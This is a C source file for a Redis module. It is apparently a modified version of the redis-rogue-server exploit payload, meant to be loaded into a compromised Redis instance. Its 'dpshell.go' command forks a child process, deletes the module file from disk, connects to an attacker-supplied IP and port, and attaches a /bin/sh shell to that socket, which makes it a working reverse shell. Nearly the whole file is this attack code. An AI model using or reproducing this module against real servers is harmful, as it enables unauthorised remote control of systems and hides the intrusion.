/*
 * dpredisshell.c
 * Created by Thomas Cope
 *
 * A modified version of 'exp.so' from https://github.com/n0b0dyCN/redis-rogue-server
 * which was built upon the original RicterZ's redis exec module: https://github.com/RicterZ/RedisModules-ExecuteCommand
 *
 */

#include "redismodule.h"

#include <stdio.h> 
#include <unistd.h>  
#include <stdlib.h> 
#include <errno.h>   
#include <sys/wait.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>

int TestCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    char hello[] = "Hello World, dpshell is loaded OK!";
	RedisModuleString *ret = RedisModule_CreateString(ctx, hello, strlen(hello));
	RedisModule_ReplyWithString(ctx, ret);
    return REDISMODULE_OK;
}

int GoGoGo(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
	if (argc == 4) {
        pid_t pid = fork();
        if (pid == 0) {
            // I am the child process
            size_t cmd_len;
            char *ip = RedisModule_StringPtrLen(argv[1], &cmd_len);
            char *port_s = RedisModule_StringPtrLen(argv[2], &cmd_len);
            char *module_s = RedisModule_StringPtrLen(argv[3], &cmd_len);
            int port = atoi(port_s);
            int s;
            remove(module_s);
            struct sockaddr_in sa;
            sa.sin_family = AF_INET;
            sa.sin_addr.s_addr = inet_addr(ip);
            sa.sin_port = htons(port);
            s = socket(AF_INET, SOCK_STREAM, 0);
            connect(s, (struct sockaddr *)&sa, sizeof(sa));
            dup2(s, 0);
            dup2(s, 1);
            dup2(s, 2);
            execve("/bin/sh", 0, 0);
        }
        signal(SIGCHLD, SIG_IGN); //Prevent zombie
	} else {
        return RedisModule_WrongArity(ctx);
    }
    return REDISMODULE_OK;
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx,"dpshell",1,REDISMODULE_APIVER_1) == REDISMODULE_ERR) {
        return REDISMODULE_ERR;
    }
    if (RedisModule_CreateCommand(ctx, "dpshell.test",TestCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR) {
        return REDISMODULE_ERR;
    }
	if (RedisModule_CreateCommand(ctx, "dpshell.go", GoGoGo, "readonly", 1, 1, 1) == REDISMODULE_ERR) {
        return REDISMODULE_ERR;
    }
    return REDISMODULE_OK;
}
